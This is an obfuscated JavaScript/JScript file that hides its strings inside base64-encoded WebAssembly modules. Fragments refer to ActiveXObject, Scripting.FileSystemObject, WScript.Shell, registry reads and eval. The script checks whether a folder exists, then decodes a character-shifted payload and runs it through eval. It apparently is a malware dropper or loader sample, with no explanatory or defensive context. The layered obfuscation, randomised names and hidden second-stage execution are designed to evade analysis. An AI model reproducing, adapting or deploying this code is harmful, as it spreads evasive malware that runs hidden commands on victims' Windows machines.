const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGuoSAgABffwBBAQt/AEGUAQt/AEHQAQt/AEH2AQt/AEGAAgt/AEGwAgt/AEG2Agt/AEHUAgt/AEGKAwt/AEGMAwt/AEGiAwt/AEGmAwt/AEGqAwt/AEGsAwt/AEG0Awt/AEG6Awt/AEHGAwt/AEHyAwt/AEGoBAt/AEHMBAt/AEHqBAt/AEGGBQt/AEGKBQt/AEGWBQt/AEGiBQt/AEH6BQt/AEH+BQt/AEGYBgt/AEGoBgt/AEHIBgt/AEHwBgt/AEH8Bgt/AEGGBwt/AEGeBwt/AEG2Bwt/AEHCBwt/AEHGBwt/AEHOBwt/AEHWBwt/AEHmBwt/AEHyBwt/AEGiCAt/AEGqCAt/AEHKCAt/AEGsCQt/AEGwCQt/AEG4CQt/AEGGCgt/AEGeCgt/AEGkCgt/AEH8Cgt/AEG8Cwt/AEHMCwt/AEHWCwt/AEHuCwt/AEHyCwt/AEGmDAt/AEG0DAt/AEHODAt/AEHeDAt/AEHqDAt/AEGMDQt/AEG+DQt/AEGYDgt/AEGeDgt/AEGiDgt/AEHUDgt/AEGWDwt/AEGeDwt/AEHEDwt/AEHODwt/AEHuDwt/AEGaEAt/AEGeEAt/AEGOEQt/AEGeEQt/AEHUEQt/AEHYEQt/AEG2Egt/AEHCEgt/AEGGEwt/AEGgEwt/AEG2Ewt/AEGSFAt/AEGkFAt/AEHMFAt/AEHQFAt/AEHmFAt/AEHsFAt/AEGUFQt/AEGeFQt/AEHYFQt/AEHuFQt/AEH8FQt/AEGAFgsH14aAgABgBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsGZGF0YTI4AxwGZGF0YTI5Ax0GZGF0YTMwAx4GZGF0YTMxAx8GZGF0YTMyAyAGZGF0YTMzAyEGZGF0YTM0AyIGZGF0YTM1AyMGZGF0YTM2AyQGZGF0YTM3AyUGZGF0YTM4AyYGZGF0YTM5AycGZGF0YTQwAygGZGF0YTQxAykGZGF0YTQyAyoGZGF0YTQzAysGZGF0YTQ0AywGZGF0YTQ1Ay0GZGF0YTQ2Ay4GZGF0YTQ3Ay8GZGF0YTQ4AzAGZGF0YTQ5AzEGZGF0YTUwAzIGZGF0YTUxAzMGZGF0YTUyAzQGZGF0YTUzAzUGZGF0YTU0AzYGZGF0YTU1AzcGZGF0YTU2AzgGZGF0YTU3AzkGZGF0YTU4AzoGZGF0YTU5AzsGZGF0YTYwAzwGZGF0YTYxAz0GZGF0YTYyAz4GZGF0YTYzAz8GZGF0YTY0A0AGZGF0YTY1A0EGZGF0YTY2A0IGZGF0YTY3A0MGZGF0YTY4A0QGZGF0YTY5A0UGZGF0YTcwA0YGZGF0YTcxA0cGZGF0YTcyA0gGZGF0YTczA0kGZGF0YTc0A0oGZGF0YTc1A0sGZGF0YTc2A0wGZGF0YTc3A00GZGF0YTc4A04GZGF0YTc5A08GZGF0YTgwA1AGZGF0YTgxA1EGZGF0YTgyA1IGZGF0YTgzA1MGZGF0YTg0A1QGZGF0YTg1A1UGZGF0YTg2A1YGZGF0YTg3A1cGZGF0YTg4A1gGZGF0YTg5A1kGZGF0YTkwA1oGZGF0YTkxA1sGZGF0YTkyA1wGZGF0YTkzA10GZGF0YTk0A14LsJmAgABfAEEBC5EBWnZhciUyMFpTclpCWlhabVp6R3hsZVpzT2hSWkFaZFolMjBaJTNEWiUyMFpuWmV3WiUyMFpBWmNadFppWnZaZVpYT1piWmpaZVpjWnQoWiUyMlpzWkNySVpwWlRpTlpHWi5mSWxaZXN5c1RFWm1ab1pCWkplWmNadFolMjJaKVolM0IlMjBadmFyWiUyME9aAABBlAELO1NaQVpiWmh2Q1pxWkl3WnhaWVprSmdablolMjAlM0RaJTIwWm5aZVp3JTIwWkFaY1p0Wml2ZVpYT1oAAEHQAQskYlpqWmVjWnRaKFolMjJac1poWkVabExaLmFacFpQWmxaSWMAAEH2AQsJQVpUWmlvbloAAEGAAgsvJTIyKVolM0JaJTIwWnZhWnJaJTIwVlpRWnJablpBWkdaeVBaRkV2WlNiWlJCWgAAQbACCwVhWkpaAABBtgILHXR6WiUyMFolM0RaJTIwbmV3WiUyMEFaY3RaaXYAAEHUAgs0WmVaWFpPYmpaZVpjWnRaKFolMjJ3WnNaY1pyWmlacHQuWlNaSFpFbFpsWiUyMlopJTNCAABBigMLAQAAQYwDCxRjSyUzQUslNUNLd2lLTkRvS1dzAABBogMLAksAAEGmAwsCWgAAQaoDCwEAAEGsAwsHWnZaYVpyAABBtAMLBVolMjAAAEG6AwsLbXV3WnZSWmtOVwAAQcYDCypaZmFaYkdnWklaakNVWm5aJTIwWiUzRCUyMFpWWlFaclpuQVpHeVpQRgAAQfIDCzVaRVp2WlNaYlJaQmFaSlp0WnouUmVnUlplWmFkWihaaVpZWk1ac1pkUXJaT1phWlRBY1pWAABBqAQLI1BEWmxoTHlaKGZaSlppWmFaQnNadklOVFp5WkVaRmtabVMAAEHMBAsdb1pXWiUyQ1olMjAlMjJBQlpDJTIyKVopWi5aYwAAQeoECxpaaGFackNvZGVaQVp0KEtaQ1ptbFp2WnpPAABBhgULAloAAEGKBQsKclp0WklaSkVWAABBlgULCndaUVpVKSUzQgAAQaIFC1ZDaHktQ2QtQ28tJTJCLXhxLUNoLXZDLWZkcy1DLWhDLSUyQiUyNUN5LWR1KDUtMy16LXZrLSgtNS1DMy0oNkMtR0MoNS0zcUNoQ3pDKDVDLTNELWZ3AABB+gULA0NsAABB/gULGS15aC1DLSU1QkNSZUMtbUNoLWYtdyg1LQAAQZgGCw4lM0IoQzUtQzUtei1DAABBqAYLH3ZmLXVDbEMtc3dDLShDNUMtSC12Q2tDaC1DLW9vLQAAQcgGCyZDLSg1NSg1QyUzQyg2RSgzLUNHLSgtM0QteWQtdSg1LTNDdi1rAABB8AYLCig1LTMoNkdDKAAAQfwGCwk1M3FoekMoNQAAQYYHCxctQzNDRC1mQy13LWx5Qy1oLUMlNUJDAABBngcLFlJDZW1oQ2Z3KDVDJTNCLShDLTU1dgAAQbYHCwtDa2gtQy1vby0oAABBwgcLAjUAAEHGBwsGSGRzLXMAAEHOBwsGLUMtb2wAAEHWBwsOQy1mQ2R3bEMtci1xLQAAQeYHCwsoLTU1KC01JTNDAABB8gcLLi1DKDZFKC0zRyhDM0MtREN5ZC1DLXUtQyg1My1LLUNXVy1DUyhDNTMoLTZHKAAAQaIICwc1QzMtcS0AAEGqCAsfQ2h6KEM1M0RDLWZ3LWxDLXloQyU1Qi1SLWUtbWhmAABByggLYXcoQzUtJTNCLUMoNTVQViU1Qi1QTyg2LTVDKDVILSU1QlBPQ0stV1ctUy0oLTU1KDVDJTNDQyg2RS1DKEMzLUctKC1DM0R5LUNkLXUoQy01LUMtM1YtQ3d1aGRwKEM1MwAAQawJCwMtKAAAQbAJCwYtNkctQwAAQbgJC0woQy01M0NxQ2gtei0oLTUzRC1mLUMtd2x5Q2gtQyU1QkNSZW0tQ2hmdygtNS0lM0ItKDVDNUNER1JHRSgtNUNIVkN3LXVoZEMtcC0AAEGGCgsWKDU1LSgtNSUzQyg2RS0oLTMtQ0dDAABBngoLBSgtM0QAAEGkCgtWLUMteS1kdS0oNTNzZHdrQy0oLTUtQzMtQyhDNkctKC1DNTNDenYtQ2stKC1DNUhWcy1oZmxkLW8tQ0lyb0NnQy1oQ3V2LUMtKDUlM0ItQyg1NVdocAAAQfwKCz9zLW9kLXdodig1NUMtKDVDJTNDLSgtQy01RSg1QzUoQzhGKEM4Ri1DKEMtNUM1QygtNUUtQyg1QyUzQkMoLQAAQbwLCw81LUMlM0JDLVAtZHdrLQAAQcwLCwgoNUhDLXUtAABB1gsLF2RxZ3JwKEM1JTNCQygtNSUzQ0MtKEMAAEHuCwsDNUQAAEHyCwszKDYlM0MtKDYtJTNDLUMtKC02JTNDKEMtNiUzQ0MtKC02LUMlM0MoNkMtJTNDKEM1Qy0AAEGmDAsMJTNDLUMtKC01RSgAAEG0DAsYLTYtQy0lM0MtKDYtJTNDKDYlM0MoLUMAAEHODAsPNkMlM0MtKCUzQUNGKDYAAEHeDAsLLTNDKC01QyUzQwAAQeoMCyEoLTVFKDUtNSgtNS1DLUhDaEMtJTdCLWgtQyg1QzUoLQAAQYwNCzA2RS0oLUMtM0dDKDNESy1XV1MoLUM1LUhSQ3NocSgtQzUtQyUzQig1NS1KQ0hXKAAAQb4NC1g1NS0oNS1GKDUtM0MoLTU1Qy1rLXctd3MoLTZDLUQoLUMtNUNJKC01SS1DZy1kZ2pyLW8tci1zLWhDKC01Qy1Idy1ycy0oNS1JZGdwbC1xKEM1LUMtSC0AAEGYDgsEc2tzAABBng4LAy0oAABBog4LMTZJLUNpKC02R0MoNi03KC02LTNDKDYtNy0oNUMtNS1DLSg1RigtQzUzLWlkQy1vQwAAQdQOC0F2LUNoKDVDJTNDKC02LUVDKDUzS1dXLVNDKDVIVkNoLUMtcS1nLShDNSUzQig1QyUzQy0oLTZFKDUtQzNsaUMtAABBlg8LByg1Myg1LQAAQZ4PCyQlM0JDLUtDV1ctU0MoNUNIQ1Z3ZEMtd0N4LXZDLSg1MyhDNgAAQcQPCwgtQ0ctKEM2AABBzg8LHkctKDUtMy0oLTZDLTVDLSgtNkMzKDYzKC01JTNDAABB7g8LKy0oLTUzKC0lM0EtQ0UtKEMzRyhDMy1EVi13Q3VoZC1wQy0oNUhSQ3MtQwAAQZoQCwNoLQAAQZ4QC25DcS0oNSUzQkMtKDUlM0MoLUM2LUUtQyhDNTNDLVYtdy1DdWhkcChDLTVIVyU3Qy1zLUNoQygtNTMtKDYtRy0oNTMoNi1DNCg2RUMoLUM1M1ZDd3UtQ2hkcEMoNUhadWx3LWgoNSUzQkNLLUNXAABBjhELD1dDLVNDKDVILUNVaEN2AABBnhELNXNyQy1xdi1oLUMtRXJnLSU3Qy0oLUM1JTNDKC02LUNFLSg1QzNDKC1DM0coM0RDVi1DLXcAAEHUEQsCQwAAQdgRC1x1aGRwQyg1SC1TcnZsQy13bENyQy1xKC01LTMtKEM2LUctKDUzLUMoQzZDMygtNi1FKC01LTNWLXdDdS1oLUNkcEMoLTVDLUgtVi1keWgtQ1dySUNsLW9oLShDAABBthILCjUlM0JzZHdrKAAAQcISC0JDLTVGKDUzKEMtNi01LSg1QyUzQy0oNkNFKC1DM0ctKC1DLTNEVi13dWhkQ3AoNS1IRm9yQ3ZoKDUtQyUzQi1DLQAAQYYTCxgoNS0lM0MtKC02RSgtNUMzLUN2ayg1LQAAQaATCxVILVZDLWtoQ29vSEMlN0JoQy1meAAAQbYTC1std0NoLSg1QyUzQkNzLWRDLXdDay1DKDVGKC01QzMoNS01KDVDNSg1LUNGKC01LUMzLUMoNS1DNUMtKC1DLTUtNSg1LUYoLTUzLSg1Qy01LXJDc0NocSg1LUMAAEGSFAsRLTUtKDVDLUYtKC01M0MtKAAAQaQUCyZDNjQtKDUlM0MtKDYtRShDNTNDLSglM0FHJTI1JTJDJTJDJTNFAABBzBQLAkEAAEHQFAsUQkNIQUJDS0FCQ0xNJTVDc0FCQwAAQeYUCwRPZnQAAEHsFAsmQUJDV0FyZSU1Q01BQkNJY0FCQ3JvQUJDU0FCQ09GVCU1Q1dBQgAAQZQVCwhDSW5BQkNkAABBnhULOG9BQkN3c0FCQyUyMEFCQ050JTVDQ0FCQ1VyQUJDckVBQkNuQUJDdEFCQ3ZBQkNlQUJDUkFCQ3MAAEHYFQsUaU9uJTVDU0FCQ3lBQkNTdGVBQgAAQe4VCw1DTUFCQ1JvQUJDb3QAAEH8FQsCWgAAQYAWCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var qQJxNBIgYGXVcosj = lS(0, 0) + lS(0, 1) + lS(0, 2) + lS(0, 3) + lS(0, 4) + lS(0, 5) + lS(0, 6) + lS(0, 7);
function iYMsdQrOaTAcVPDlhLy(zrKQkoXfuEMOgcxV, uEmGxVPbYLINyfwnd) {
    return zrKQkoXfuEMOgcxV.split(uEmGxVPbYLINyfwnd).join(lS(0, 8));
}
var ioabFQsYuAOHwnPT = iYMsdQrOaTAcVPDlhLy(lS(0, 9), lS(0, 10));
var ilrwETnIvkLXKFYSy = window[lS(0, 94, true)](iYMsdQrOaTAcVPDlhLy(qQJxNBIgYGXVcosj, lS(0, 11)));
if (SrBXmzGxlesOhRAd.FolderExists(ioabFQsYuAOHwnPT) == true) {
    var KCmlvzOrtIJEVwQU = 93856263 / 93856263;
    var EXWITBNwrjogyqVPcO = lS(0, 12);
    function juPCDGdkgTivIHnMSK(rWAtsndTiHyaFgKxw) {
        return String.fromCharCode(rWAtsndTiHyaFgKxw);
    }
    var iFrEjBbHTuYsWvSh = lS(0, 13) + lS(0, 14) + lS(0, 15) + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23);
    var xVzuDTAtmQkCGBJUe = lS(0, 24) + lS(0, 25) + lS(0, 26) + lS(0, 27) + lS(0, 28) + lS(0, 29) + lS(0, 30) + lS(0, 31) + lS(0, 32) + lS(0, 33) + lS(0, 34) + lS(0, 35) + lS(0, 36) + lS(0, 37) + lS(0, 38) + lS(0, 39) + lS(0, 40) + lS(0, 41) + lS(0, 42) + lS(0, 43) + lS(0, 44) + lS(0, 45) + lS(0, 46) + lS(0, 47) + lS(0, 48) + lS(0, 49) + lS(0, 50) + lS(0, 51) + lS(0, 52) + lS(0, 53) + lS(0, 54) + lS(0, 55) + lS(0, 56) + lS(0, 57) + lS(0, 58) + lS(0, 59) + lS(0, 60) + lS(0, 61) + lS(0, 62) + lS(0, 63) + lS(0, 64) + lS(0, 65) + lS(0, 66) + lS(0, 67) + lS(0, 68) + lS(0, 69) + lS(0, 70) + lS(0, 71) + lS(0, 72) + lS(0, 73) + lS(0, 74) + lS(0, 75) + lS(0, 76) + lS(0, 77) + lS(0, 78) + lS(0, 79) + lS(0, 80) + lS(0, 81) + lS(0, 82) + lS(0, 83) + lS(0, 84);
    var fJiaBsvINTyEFkmSoW = lS(0, 85) + lS(0, 86) + lS(0, 87) + lS(0, 88) + lS(0, 89) + lS(0, 90) + lS(0, 91) + lS(0, 92);
    var jBsOUyPTtDfeQIq = window[lS(0, 94, true)](iYMsdQrOaTAcVPDlhLy(iFrEjBbHTuYsWvSh, lS(0, 93)));
    (() => {
        var JXshBDRIjkxdzmgMY = 0;
        const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
            env: {
                test: () => {
                    return JXshBDRIjkxdzmgMY < xVzuDTAtmQkCGBJUe.length ? 1 : 0;
                },
                update: () => {
                    JXshBDRIjkxdzmgMY++;
                },
                body: () => {
                    {
                        KCmlvzOrtIJEVwQU = xVzuDTAtmQkCGBJUe.charCodeAt(JXshBDRIjkxdzmgMY) - muwvRkNWfabGgIjCUn * 4422 / 85492;
                        (() => {
                            const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        {
                                            EXWITBNwrjogyqVPcO += juPCDGdkgTivIHnMSK(KCmlvzOrtIJEVwQU);
                                        }
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance0.exports;
                            return __exports.data(KCmlvzOrtIJEVwQU != muwvRkNWfabGgIjCUn * 352002 / 486098 && KCmlvzOrtIJEVwQU != muwvRkNWfabGgIjCUn * 473280 / 428910 ? 1 : 0);
                        })();
                    }
                }
            }
        });
        const __exports = __forInstance0.exports;
        return __exports.data();
    })();
    var pCDbAnEraWlHfSTX = window[lS(0, 94, true)](EXWITBNwrjogyqVPcO);
}